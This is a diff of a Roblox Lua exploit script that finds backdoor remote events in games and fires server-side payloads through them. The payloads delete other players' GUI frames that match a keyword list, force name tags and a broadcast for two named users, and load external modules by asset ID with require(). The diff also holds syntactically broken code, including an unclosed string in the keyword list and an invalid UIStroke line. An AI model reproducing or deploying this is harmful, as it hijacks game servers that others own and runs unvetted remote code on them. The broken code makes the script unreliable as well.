@@ -2523,21 +2523,16 @@ local function OHZSZXY_fake_script() -- Fake Script: StarterGui.Starlight.Frame.
 			Text = "Backdoor: " .. scanTime .."s " .. (remoteEvent and remoteEvent.Name or remoteFunction and remoteFunction.Name or "nil"),
 			Duration = 4
 		})
-				local LigmaProject = Instance.new("ScreenGui")
-                                local ImageLabeeel = Instance.new("ImageLabel")
-                                local fr6 = Instance.new("TextButton")
-                                local TextLabel_2 = Instance.new("TextLabel")
-	local success, result = pcall(function()
-	                fireRemoteEvent('local Players=game:GetService("Players");local suspiciousKeywords={"hd admin","ranker","java1","darklord","pracharatbampen","kid,"k1d","kidd","k1dd","k00p","l**pzworld","tubers","h01pk","ban","ban gui","itsnotskeleton","l0ck","bnkksd hd","andres","xxandresxx","c00lgui","c00l","elmarz","teamf*t","5x5x5x5","g00b","kick","ban","undetectable gui","undetectable","acron","russia","infector","potato","sans_gboard","l*ckgui","starp4tch","user1337","menotgonnadobadstuff","8t010t8","darius","j00p","144anz","sigma","noot","1x1x1x1","lacking923","kaax","s1n","k_aax","ep1c","zazol","lalol","cxyz","saudi","j01tar0","koma","gigxxx","hax0rz","g00l","enstrio","br1cked","hax"};local function isSuspicious(str)str=str:lower()for _,k in ipairs(suspiciousKeywords)do if str:find(k)then return true end end return false end;local function getOwningPlayer(i)local p=i;while p and not p:IsA("PlayerGui")do p=p.Parent end;if p and p:IsA("PlayerGui")then local c=p.Parent;return Players:GetPlayerFromCharacter(c)or Players:FindFirstChild(c.Name)end;return nil end;local function deleteIfSuspicious(i)if i:IsA("TextLabel")or i:IsA("Frame")then local n=i.Name;local t=i:IsA("TextLabel")and i.Text or"";local pl=getOwningPlayer(i);if pl and pl.Name=="greguiscool"then return nil end;if isSuspicious(n)or isSuspicious(t)then local f=i;while f and not f:IsA("Frame")do f=f.Parent end;if f then local h=Instance.new("Hint",workspace);h.Text="[Skid] Deleted sus Frame: "..f.Name..(pl and" (user: "..pl.Name..")"or"");task.delay(3,function()h:Destroy()end);f:Destroy()end end end end;for _,o in ipairs(game:GetDescendants())do pcall(deleteIfSuspicious,o)end;game.DescendantAdded:Connect(function(o)pcall(deleteIfSuspicious,o)end);task.spawn(function()while true do for _,o in ipairs(game:GetDescendants())do pcall(deleteIfSuspicious,o)end;task.wait(5)end end)')
-                        fireRemoteEvent('for _,p in ipairs(game.Players:GetPlayers())do if p.Name=="greguiscool"or p.Name=="raizarit"then if p.Character and p.Character:FindFirstChild("Head")then local t=Instance.new("BillboardGui");t.Name="NameTag";t.Adornee=p.Character.Head;t.Parent=p.Character.Head;t.Size=UDim2.new(0,200,0,50);t.StudsOffset=Vector3.new(0,2.5,0);t.AlwaysOnTop=true;local l=Instance.new("TextLabel",t);l.Size=UDim2.new(1,0,1,0);l.BackgroundTransparency=1;l.Font=Enum.Font.Arcade;l.TextScaled=true;l.TextColor3=Color3.fromRGB(255,223,0);if p.Name=="greguiscool"then l.Text="👑The Legend👑";elseif p.Name=="raizarit"then l.Text="⚡The Legend⚡";end end end end;local e=Instance.new("Hint",workspace);e.Text="⚡ A Legendary Presence Has Entered the Realm! All Hail the Legend! ⚡";local s=Instance.new("Sound");s.Parent=workspace;s.SoundId="rbxassetid://118529969200894";s.Looped=true;s.Volume=1;s.PlaybackSpeed=1;s.TimePosition=41;s:Play();wait(13.3);local d=2;local w=d/20;local v=s.Volume;for i=1,20 do s.Volume=v*(1-i/20);wait(w);end;s:Stop();e:Destroy();')
-                        fireRemoteEvent('require(6735691273).BetaAntiSkid()')
-			fireRemoteEvent('require(7458325257).antiban()')
-                        fireRemoteEvent('require(3986243232).load("im gay",{"' .. game.Players.LocalPlayer.Name ..  '"})')
-                      end)
-                   if not success then 
-                     warn("Error: ", result)
-		end		
-LigmaProject.Name = "LigmaProject"
+		local LigmaProject = Instance.new("ScreenGui")
+                local ImageLabeeel = Instance.new("ImageLabel")
+                local fr6 = Instance.new("TextButton")
+                local TextLabel_2 = Instance.new("TextLabel")
+	        fireRemoteEvent('local Players=game:GetService("Players");local suspiciousKeywords={"hd admin","ranker","java1","darklord","pracharatbampen","kid,"k1d","kidd","k1dd","k00p","l**pzworld","tubers","h01pk","ban","ban gui","itsnotskeleton","l0ck","bnkksd hd","andres","xxandresxx","c00lgui","c00l","elmarz","teamf*t","5x5x5x5","g00b","kick","ban","undetectable gui","undetectable","acron","russia","infector","potato","sans_gboard","l*ckgui","starp4tch","user1337","menotgonnadobadstuff","8t010t8","darius","j00p","144anz","sigma","noot","1x1x1x1","lacking923","kaax","s1n","k_aax","ep1c","zazol","lalol","cxyz","saudi","j01tar0","koma","gigxxx","hax0rz","g00l","enstrio","br1cked","hax"};local function isSuspicious(str)str=str:lower()for _,k in ipairs(suspiciousKeywords)do if str:find(k)then return true end end return false end;local function getOwningPlayer(i)local p=i;while p and not p:IsA("PlayerGui")do p=p.Parent end;if p and p:IsA("PlayerGui")then local c=p.Parent;return Players:GetPlayerFromCharacter(c)or Players:FindFirstChild(c.Name)end;return nil end;local function deleteIfSuspicious(i)if i:IsA("TextLabel")or i:IsA("Frame")then local n=i.Name;local t=i:IsA("TextLabel")and i.Text or"";local pl=getOwningPlayer(i);if pl and pl.Name=="greguiscool"then return nil end;if isSuspicious(n)or isSuspicious(t)then local f=i;while f and not f:IsA("Frame")do f=f.Parent end;if f then local h=Instance.new("Hint",workspace);h.Text="[Skid] Deleted sus Frame: "..f.Name..(pl and" (user: "..pl.Name..")"or"");task.delay(3,function()h:Destroy()end);f:Destroy()end end end end;for _,o in ipairs(game:GetDescendants())do pcall(deleteIfSuspicious,o)end;game.DescendantAdded:Connect(function(o)pcall(deleteIfSuspicious,o)end);task.spawn(function()while true do for _,o in ipairs(game:GetDescendants())do pcall(deleteIfSuspicious,o)end;task.wait(5)end end)')
+                fireRemoteEvent('require(6735691273).BetaAntiSkid()')
+		fireRemoteEvent('require(7458325257).antiban()')
+                fireRemoteEvent('require(3986243232).load("im gay",{"' .. game.Players.LocalPlayer.Name ..  '"})')
+
+LigmaProject.Name = "C00lProject"
 LigmaProject.Parent = game.CoreGui
 
 ImageLabeeel.Parent = LigmaProject
@@ -2555,11 +2550,11 @@ fr6.Parent = ImageLabeeel
 fr6.BackgroundColor3 = Color3.fromRGB(0,0,0)
 fr6.BackgroundTransparency = 1.000
 fr6.Position = UDim2.new(0, 0, -0.633333325, 0)
-fr6.Size = UDim2.new(0, 90, 0, 50)
+fr6.Size = UDim2.new(0, 100, 0, 50)
 fr6.Font = Enum.Font.Arcade
 fr6.Text = "R15 -> R6"
 fr6.TextColor3 = Color3.fromRGB(255, 0, 0)
-fr6.TextScaled = false
+fr6.TextScaled = true
 fr6.TextSize = 18.000
 fr6.TextTransparency = 0
 fr6.TextWrapped = true
@@ -2580,6 +2575,8 @@ TextLabel_2.TextTransparency = 1.000
 TextLabel_2.TextWrapped = true
 TextLabel_2.BorderColor3 = Color3.fromRGB(255,0,0)
 TextLabel_2.BorderSizePixel = 2
+
+Instance.new("UIStroke",TextLabel_2).Color3 = Color3.fromRGB(255,0,0).Thickness = 1.3
 
 local function UpdateVisibilityBasedOnRigType()
     local TweenService = game:GetService("TweenService")
